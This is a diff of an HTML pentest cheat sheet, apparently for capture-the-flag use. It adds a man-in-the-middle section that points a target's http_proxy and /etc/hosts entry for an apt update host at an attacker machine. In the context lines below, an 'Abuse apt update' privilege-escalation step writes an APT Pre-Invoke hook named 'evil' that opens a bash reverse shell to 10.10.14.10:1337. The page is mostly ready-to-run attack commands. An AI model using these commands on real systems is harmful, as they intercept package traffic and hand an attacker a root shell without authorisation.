@@ -47,7 +47,18 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="privesc">Privesc</h3>
+<h3 id="mitm-man-in-the-middle">MITM (Man-in-the-Middle)</h3>
+<h4 id="in-target">In target</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In target</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">http_proxy</span><span class="o">=</span>http://10.10.14.10:8888
+</span></span></code></pre></div><h4 id="in-local">In local</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Tool</span>
+</span></span><span class="line"><span class="cl">pip3 install --upgrade proxy.py
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start a proxy server</span>
+</span></span><span class="line"><span class="cl">proxy --hostname 0.0.0.0 --port <span class="m">8888</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Edit /etc/hosts to point to yours server</span>
+</span></span><span class="line"><span class="cl">10.10.14.10 apt.update.example.com
+</span></span></code></pre></div><h3 id="privesc">Privesc</h3>
 <h4 id="abuse-apt-update">Abuse apt update</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a malicious config</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;APT::Update::Pre-Invoke {&#34;bash -c &#39;</span><span class="se">\&#39;</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.10/1337 0&gt;&amp;1&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;&#34;}&#39;</span> &gt; /etc/apt/apt.conf.d/evil
